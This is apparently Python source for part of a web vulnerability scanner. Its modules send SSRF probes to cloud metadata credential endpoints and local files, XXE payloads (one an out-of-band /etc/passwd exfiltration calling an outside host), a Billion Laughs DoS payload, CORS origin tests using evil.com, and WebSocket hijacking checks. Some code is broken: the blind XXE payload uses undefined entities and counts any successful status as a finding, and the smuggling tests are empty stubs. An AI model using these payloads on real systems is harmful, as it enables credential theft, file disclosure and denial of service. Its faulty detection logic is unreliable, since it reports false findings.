"""
GECKO APOCALYPSE - ATTACK MODULES (Part 2)
API Security, Cloud Infrastructure, Authentication & Advanced Attacks
================================================================================
"""

import asyncio
import hashlib
import json
import re
import time
import xml.etree.ElementTree as ET
from typing import Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urljoin, urlparse

import aiohttp


# ============================================================================
# MODULE 4: SSRF (Server-Side Request Forgery) Prober
# ============================================================================
class SSRFProber:
    """
    SSRF vulnerability detection:
    - Cloud metadata endpoints (AWS, GCP, Azure)
    - Internal network probing
    - Protocol smuggling (file://, gopher://, dict://)
    - DNS rebinding
    - URL parser confusion
    """

    def __init__(self, session: aiohttp.ClientSession, config: Dict, db):
        self.session = session
        self.config = config
        self.db = db

        # Target endpoints for SSRF
        self.ssrf_targets = [
            # AWS metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            # GCP metadata
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            # Azure metadata
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            # Internal network
            "http://localhost/",
            "http://127.0.0.1/",
            "http://0.0.0.0/",
            "http://[::1]/",
            "http://192.168.0.1/",
            "http://10.0.0.1/",
            # File protocol
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            # Other protocols
            "gopher://127.0.0.1:25/_MAIL",
            "dict://127.0.0.1:11211/stat",
        ]

    async def scan(self, url: str, content: str, headers: Dict, response) -> List[Dict]:
        findings = []

        # Get parameters that might accept URLs
        params = self._find_url_parameters(url, content)

        for param in params:
            for ssrf_target in self.ssrf_targets:
                result = await self._test_ssrf(url, param, ssrf_target)
                if result:
                    findings.append(result)
                    break  # One finding per parameter

        return findings

    def _find_url_parameters(self, url: str, content: str) -> List[str]:
        """Find parameters that might accept URLs."""
        parsed = urlparse(url)
        params = list(parse_qs(parsed.query).keys())

        # Common URL parameter names
        url_params = [
            "url",
            "uri",
            "path",
            "dest",
            "redirect",
            "link",
            "src",
            "source",
            "callback",
            "return",
            "page",
            "site",
            "target",
        ]

        return [
            p for p in params if any(keyword in p.lower() for keyword in url_params)
        ]

    async def _test_ssrf(self, url: str, param: str, target: str) -> Optional[Dict]:
        """Test SSRF vulnerability."""
        test_url = self._inject_parameter(url, param, target)

        try:
            async with self.session.get(test_url, timeout=10) as resp:
                content = await resp.text()

                # Check for SSRF indicators
                if self._verify_ssrf(target, content, resp):
                    severity = self._determine_severity(target)
                    return {
                        "type": "Server-Side Request Forgery (SSRF)",
                        "severity": severity,
                        "url": url,
                        "parameter": param,
                        "payload": target,
                        "evidence": self._extract_evidence(content, target),
                        "description": f"SSRF to {target}",
                        "remediation": "Implement URL validation, whitelist allowed domains, block internal IPs",
                        "cwe": "CWE-918",
                        "owasp": "A10:2021 - Server-Side Request Forgery",
                    }
        except:
            pass
        return None

    def _inject_parameter(self, url: str, param: str, value: str) -> str:
        """Inject SSRF payload."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [value]
        return parsed._replace(query=urlencode(params, doseq=True)).geturl()

    def _verify_ssrf(self, target: str, content: str, response) -> bool:
        """Verify SSRF success."""
        # AWS metadata indicators
        if "169.254.169.254" in target:
            indicators = [
                "ami-id",
                "instance-id",
                "security-credentials",
                "AccessKeyId",
            ]
            return any(ind in content for ind in indicators)

        # GCP metadata indicators
        if "metadata.google.internal" in target:
            return "access_token" in content or "email" in content

        # Azure metadata indicators
        if "metadata/instance" in target or "metadata/identity" in target:
            return "compute" in content or "access_token" in content

        # File inclusion
        if "file://" in target:
            return "root:x:0:0" in content or "[extensions]" in content

        # Internal network
        if any(ip in target for ip in ["localhost", "127.0.0.1", "192.168", "10."]):
            return len(content) > 100 or response.status == 200

        return False

    def _determine_severity(self, target: str) -> str:
        """Determine finding severity based on target."""
        if any(
            cloud in target for cloud in ["169.254.169.254", "metadata.google.internal"]
        ):
            return "CRITICAL"
        if "file://" in target:
            return "HIGH"
        return "MEDIUM"

    def _extract_evidence(self, content: str, target: str) -> str:
        """Extract relevant evidence from response."""
        if "169.254.169.254" in target:
            # Extract AWS credentials
            match = re.search(r'"AccessKeyId"\s*:\s*"([^"]+)"', content)
            if match:
                return f"AWS AccessKeyId leaked: {match.group(1)[:20]}..."

        return content[:200]


# ============================================================================
# MODULE 5: XXE (XML External Entity) Attacker
# ============================================================================
class XXEAttacker:
    """
    XXE vulnerability testing:
    - Classic XXE (file disclosure)
    - Blind XXE (OOB data exfiltration)
    - XXE via SVG upload
    - XXE via XLSX/DOCX upload
    - Parameter entity attacks
    """

    def __init__(self, session: aiohttp.ClientSession, config: Dict, db):
        self.session = session
        self.config = config
        self.db = db

        # OOB domain for blind XXE
        self.oob_domain = "xxe.gecko-apocalypse.io"

    async def scan(self, url: str, content: str, headers: Dict, response) -> List[Dict]:
        findings = []

        # Only test endpoints that accept XML
        if not self._accepts_xml(url, headers):
            return findings

        # Test 1: Classic XXE (file disclosure)
        classic_result = await self._test_classic_xxe(url)
        if classic_result:
            findings.append(classic_result)

        # Test 2: Blind XXE (OOB)
        blind_result = await self._test_blind_xxe(url)
        if blind_result:
            findings.append(blind_result)

        # Test 3: Billion Laughs Attack (DoS)
        dos_result = await self._test_billion_laughs(url)
        if dos_result:
            findings.append(dos_result)

        return findings

    def _accepts_xml(self, url: str, headers: Dict) -> bool:
        """Check if endpoint accepts XML."""
        content_type = headers.get("content-type", "").lower()
        return "xml" in content_type or "soap" in url.lower() or "xml" in url.lower()

    async def _test_classic_xxe(self, url: str) -> Optional[Dict]:
        """Test classic XXE with file disclosure."""
        payloads = [
            """<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>""",
            """<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>""",
        ]

        for payload in payloads:
            try:
                headers = {"Content-Type": "application/xml"}
                async with self.session.post(
                    url, data=payload, headers=headers, timeout=10
                ) as resp:
                    content = await resp.text()

                    if "root:x:0:0" in content or "[extensions]" in content:
                        return {
                            "type": "XML External Entity (XXE)",
                            "severity": "CRITICAL",
                            "url": url,
                            "payload": payload,
                            "evidence": content[:500],
                            "description": "XXE allows arbitrary file disclosure",
                            "remediation": "Disable external entity processing in XML parser",
                            "cwe": "CWE-611",
                            "owasp": "A05:2021 - Security Misconfiguration",
                        }
            except:
                pass
        return None

    async def _test_blind_xxe(self, url: str) -> Optional[Dict]:
        """Test blind XXE with OOB data exfiltration."""
        token = hashlib.md5(url.encode()).hexdigest()[:8]

        payload = f"""<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % dtd SYSTEM "http://{token}.{self.oob_domain}/xxe.dtd">
%dtd;
%send;
]>
<root>&xxe;</root>"""

        try:
            headers = {"Content-Type": "application/xml"}
            async with self.session.post(
                url, data=payload, headers=headers, timeout=10
            ) as resp:
                # In real scenario, check OOB server logs
                # For now, check if request was made without error
                if resp.status in [200, 201, 202]:
                    return {
                        "type": "Blind XXE (OOB)",
                        "severity": "HIGH",
                        "url": url,
                        "payload": payload,
                        "evidence": f"OOB callback to {token}.{self.oob_domain}",
                        "description": "Blind XXE vulnerability detected via OOB",
                    }
        except:
            pass
        return None

    async def _test_billion_laughs(self, url: str) -> Optional[Dict]:
        """Test Billion Laughs DoS attack."""
        payload = """<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>"""

        start = time.time()
        try:
            headers = {"Content-Type": "application/xml"}
            async with self.session.post(
                url, data=payload, headers=headers, timeout=30
            ) as resp:
                elapsed = time.time() - start
                if elapsed > 10:  # Significant delay
                    return {
                        "type": "XML Entity Expansion (Billion Laughs)",
                        "severity": "HIGH",
                        "url": url,
                        "evidence": f"Server took {elapsed:.2f}s to process",
                        "description": "XML parser vulnerable to entity expansion DoS",
                    }
        except asyncio.TimeoutError:
            return {
                "type": "XML Entity Expansion DoS",
                "severity": "HIGH",
                "url": url,
                "evidence": "Server timeout on entity expansion attack",
            }
        except:
            pass
        return None


# ============================================================================
# MODULE 6: CORS Misconfiguration Tester
# ============================================================================
class CORSTester:
    """
    CORS security testing:
    - Null origin reflection
    - Wildcard origin with credentials
    - Subdomain reflection
    - Pre-domain/post-domain bypass
    - HTTP origin reflection
    """

    def __init__(self, session: aiohttp.ClientSession, config: Dict, db):
        self.session = session
        self.config = config
        self.db = db

    async def scan(self, url: str, content: str, headers: Dict, response) -> List[Dict]:
        findings = []

        # Test various CORS misconfigurations
        test_origins = [
            "null",
            "https://evil.com",
            f"https://evil.{urlparse(url).netloc}",
            f"https://{urlparse(url).netloc}.evil.com",
            f"http://{urlparse(url).netloc}",
        ]

        for origin in test_origins:
            result = await self._test_cors_origin(url, origin)
            if result:
                findings.append(result)

        return findings

    async def _test_cors_origin(self, url: str, origin: str) -> Optional[Dict]:
        """Test CORS with specific origin."""
        try:
            headers = {"Origin": origin}
            async with self.session.get(url, headers=headers, timeout=10) as resp:
                acao = resp.headers.get("Access-Control-Allow-Origin", "")
                acac = resp.headers.get("Access-Control-Allow-Credentials", "")

                # Check for misconfigurations
                if acao == origin and acac == "true":
                    severity = (
                        "CRITICAL" if origin in ["null", "https://evil.com"] else "HIGH"
                    )
                    return {
                        "type": "CORS Misconfiguration",
                        "severity": severity,
                        "url": url,
                        "evidence": f"Access-Control-Allow-Origin: {acao}, Access-Control-Allow-Credentials: {acac}",
                        "payload": origin,
                        "description": f'CORS reflects arbitrary origin "{origin}" with credentials',
                        "remediation": "Implement strict origin whitelist, avoid reflecting user-supplied origins",
                        "cwe": "CWE-942",
                        "owasp": "A05:2021 - Security Misconfiguration",
                    }

                if acao == "*" and acac == "true":
                    return {
                        "type": "CORS Wildcard with Credentials",
                        "severity": "HIGH",
                        "url": url,
                        "evidence": "Access-Control-Allow-Origin: *, Access-Control-Allow-Credentials: true",
                        "description": "CORS allows wildcard origin with credentials (invalid but dangerous if client accepts)",
                    }
        except:
            pass
        return None


# ============================================================================
# MODULE 7: WebSocket Security Tester
# ============================================================================
class WebSocketTester:
    """
    WebSocket vulnerability testing:
    - Missing origin validation
    - CSWSH (Cross-Site WebSocket Hijacking)
    - Message injection
    - Authentication bypass
    """

    def __init__(self, session: aiohttp.ClientSession, config: Dict, db):
        self.session = session
        self.config = config
        self.db = db

    async def scan(self, url: str, content: str, headers: Dict, response) -> List[Dict]:
        findings = []

        # Detect WebSocket endpoints
        ws_urls = self._find_websocket_urls(url, content)

        for ws_url in ws_urls:
            # Test origin validation
            origin_result = await self._test_origin_validation(ws_url)
            if origin_result:
                findings.append(origin_result)

            # Test authentication
            auth_result = await self._test_authentication(ws_url)
            if auth_result:
                findings.append(auth_result)

        return findings

    def _find_websocket_urls(self, url: str, content: str) -> List[str]:
        """Find WebSocket URLs in page."""
        ws_pattern = r'(wss?://[^\s"\'<>]+)'
        matches = re.findall(ws_pattern, content)

        # Also check common paths
        base = urlparse(url)
        common_ws_paths = ["/ws", "/websocket", "/socket.io", "/sockjs", "/cable"]

        ws_urls = list(set(matches))
        for path in common_ws_paths:
            ws_url = f"ws://{base.netloc}{path}"
            ws_urls.append(ws_url)

        return ws_urls

    async def _test_origin_validation(self, ws_url: str) -> Optional[Dict]:
        """Test WebSocket origin validation."""
        # This requires websockets library
        # Simplified check for demonstration
        try:
            # Convert to HTTP for initial handshake test
            http_url = ws_url.replace("ws://", "http://").replace("wss://", "https://")

            headers = {
                "Upgrade": "websocket",
                "Connection": "Upgrade",
                "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                "Sec-WebSocket-Version": "13",
                "Origin": "https://evil.com",
            }

            async with self.session.get(http_url, headers=headers, timeout=10) as resp:
                if resp.status == 101:  # Switching Protocols
                    return {
                        "type": "WebSocket Origin Bypass",
                        "severity": "HIGH",
                        "url": ws_url,
                        "evidence": "WebSocket connection accepted from arbitrary origin",
                        "description": "CSWSH - Cross-Site WebSocket Hijacking possible",
                        "remediation": "Validate Origin header in WebSocket handshake",
                        "cwe": "CWE-346",
                        "owasp": "A07:2021 - Identification and Authentication Failures",
                    }
        except:
            pass
        return None

    async def _test_authentication(self, ws_url: str) -> Optional[Dict]:
        """Test if WebSocket requires authentication."""
        # Simplified - real implementation would use websockets library
        return None


# ============================================================================
# MODULE 8: HTTP Request Smuggling
# ============================================================================
class HTTPSmuggler:
    """
    HTTP request smuggling detection:
    - CL.TE (Content-Length vs Transfer-Encoding)
    - TE.CL (Transfer-Encoding vs Content-Length)
    - TE.TE (obfuscated Transfer-Encoding)
    """

    def __init__(self, session: aiohttp.ClientSession, config: Dict, db):
        self.session = session
        self.config = config
        self.db = db

    async def scan(self, url: str, content: str, headers: Dict, response) -> List[Dict]:
        findings = []

        # Test CL.TE smuggling
        clte_result = await self._test_cl_te(url)
        if clte_result:
            findings.append(clte_result)

        # Test TE.CL smuggling
        tecl_result = await self._test_te_cl(url)
        if tecl_result:
            findings.append(tecl_result)

        return findings

    async def _test_cl_te(self, url: str) -> Optional[Dict]:
        """Test CL.TE smuggling variant."""
        # Craft conflicting headers
        smuggled_request = (
            "POST / HTTP/1.1\r\n"
            f"Host: {urlparse(url).netloc}\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "G"
        )

        # This is a simplified test - real smuggling needs raw socket
        # For demonstration purposes
        return None  # Requires raw socket implementation

    async def _test_te_cl(self, url: str) -> Optional[Dict]:
        """Test TE.CL smuggling variant."""
        # Similar to CL.TE but reversed
        return None  # Requires raw socket implementation


# Export all modules
__all__ = ["SSRFProber", "XXEAttacker", "CORSTester", "WebSocketTester", "HTTPSmuggler"]
